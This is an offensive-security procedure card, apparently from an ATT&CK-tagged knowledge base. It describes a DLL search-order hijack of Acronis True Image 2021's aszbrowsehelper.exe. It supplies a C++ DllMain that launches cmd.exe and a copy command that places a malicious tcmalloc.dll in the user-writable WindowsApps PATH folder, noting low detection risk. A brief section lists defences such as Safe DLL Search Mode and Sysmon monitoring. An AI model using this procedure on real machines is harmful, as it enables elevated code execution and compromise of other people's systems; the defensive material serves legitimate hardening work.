---
id: uuid-place-dll
tags:
  - dll-hijacking
  - execution
  - windows
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[DLL Search Order Hijacking]]'
updated_at: '2025-12-14T17:29:09.433Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[DLL Search Order Hijacking]]'
---
# Place Malicious DLL in User-Controlled PATH Directory

## Summary

This procedure involves compiling and placing a malicious tcmalloc.dll in a user-writable directory within the Windows PATH, exploiting the DLL search order in aszbrowsehelper.exe.

## Description

Acronis True Image 2021's aszbrowsehelper.exe searches for tcmalloc.dll in untrusted locations like %USERPROFILE%\AppData\Local\Microsoft\WindowsApps, which is user-controlled and in the PATH. The malicious DLL contains C++ code to spawn an elevated cmd.exe. Prerequisites include a C++ compiler and the Secure Zone created. Outcome: DLL positioned for hijacking without admin rights.

## Requirements

1. C++ development environment (e.g., Visual Studio)
2. Source code for malicious DLL (spawns cmd.exe)
3. Write access to %USERPROFILE%\AppData\Local\Microsoft\WindowsApps

## Defense

Defensive measures and detection strategies:

- Enable Safe DLL Search Mode via registry (HKLM\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode=1)
- Monitor file writes to PATH directories with Sysmon (Event ID 11)
- Use application whitelisting to block unsigned DLLs

## Objectives

1. Hijack the DLL loading mechanism
2. Prepare for code execution on process trigger
3. Maintain low detection risk pre-exploitation

## Instructions

### Step 1: Compile Malicious DLL

**Context**: Build the DLL from C++ source code that executes a payload (e.g., CreateProcess for cmd.exe).

No command; use Visual Studio or cl.exe to compile.

> Example C++: #include <windows.h> int APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { if (ul_reason_for_call == DLL_PROCESS_ATTACH) { ShellExecute(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOW); } return TRUE; }

### Step 2: Copy DLL to Target Directory

**Context**: Place the compiled tcmalloc.dll in the hijackable PATH location.

Use File Explorer or copy command:

```cmd
copy tcmalloc.dll "%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\tcmalloc.dll"
```

> Verify with dir "%USERPROFILE%\AppData\Local\Microsoft\WindowsApps\tcmalloc.dll".

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[DLL Search Order Hijacking]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[dll-hijacking]]
- [[Execution]]
- [[windows]]
